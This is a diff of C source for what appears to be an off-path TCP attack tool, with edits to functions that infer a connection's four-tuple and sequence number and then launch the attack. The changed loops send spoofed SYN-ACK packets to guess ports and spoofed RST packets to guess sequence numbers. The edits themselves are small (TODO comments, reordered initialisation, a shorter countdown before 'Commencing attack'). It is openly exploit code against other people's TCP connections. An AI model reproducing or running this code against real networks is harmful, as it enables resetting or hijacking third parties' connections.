@@ -830,6 +830,7 @@ int infer_four_tuple(void)
 
 			bs_mid = bs_start = sched[ci].start;
 			bs_end = sched[ci].end;
+			// XXX: TODO: implement optmization for < 14 ports to probe...
 			for (guess = bs_start; guess < bs_end; guess++) {
 				spoof->src.sin_port = htons(guess);
 				if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
@@ -843,6 +844,7 @@ int infer_four_tuple(void)
 			u_long guess;
 
 			bs_mid = (bs_start + bs_end) / 2;
+			// XXX: TODO: implement optmization for < 14 ports to probe...
 			for (guess = bs_mid; guess < bs_end; guess++) {
 				spoof->src.sin_port = htons(guess);
 				if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
@@ -985,11 +987,11 @@ int infer_sequence_number(void)
 			/* allocate a schedule for testing sequence blocks
 			 * NOTE: the values in the schedule are actually block numbers
 			 */
+			step = 0;
+
 			sched = build_schedule(0, UINT32_MAX / g_ctx.winsz, &nchunks);
 			if (!sched)
 				return 0;
-
-			step = 0;
 			/* further stages will launch as things progress */
 		}
 
@@ -1003,6 +1005,7 @@ int infer_sequence_number(void)
 
 			/* send em! */
 			pkts_sent = 0;
+			// XXX: TODO: implement optmization for < 14 ports to probe...
 			for (seq_block = sched[ci].start; seq_block < sched[ci].end; seq_block++) {
 				spoof->seq = seq_block * g_ctx.winsz;
 				if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
@@ -1023,6 +1026,7 @@ int infer_sequence_number(void)
 
 			/* send em! */
 			pkts_sent = 0;
+			// XXX: TODO: implement optmization for < 14 ports to probe...
 			for (seq_block = bs_mid; seq_block < bs_end; seq_block++) {
 				spoof->seq = seq_block * g_ctx.winsz;
 				if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
@@ -1040,6 +1044,7 @@ int infer_sequence_number(void)
 
 			/* send em! */
 			pkts_sent = 0;
+			// XXX: TODO: implement optmization for < 14 ports to probe...
 			for (seq_guess = pr_start; seq_guess > pr_end; seq_guess--) {
 				spoof->seq = seq_guess;
 				if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
@@ -1048,7 +1053,6 @@ int infer_sequence_number(void)
 				pkts_sent++;
 			}
 			/* we'll do maintenance after we check the results */
-		} else if (step == 3) {
 		}
 
 #ifdef DEBUG_SEQ_INFER_SPOOF_SEND
@@ -1287,8 +1291,8 @@ int set_up_attack(void)
 							setterm(0);
 
 							if (g_ctx.autostart) {
-								printf("[*] Commencing attack in 1 second...\n");
-								sleep(1);
+								usleep(500000);
+								printf("[*] Commencing attack...\n");
 								if (!conduct_offpath_attack())
 									return 1;
 							}
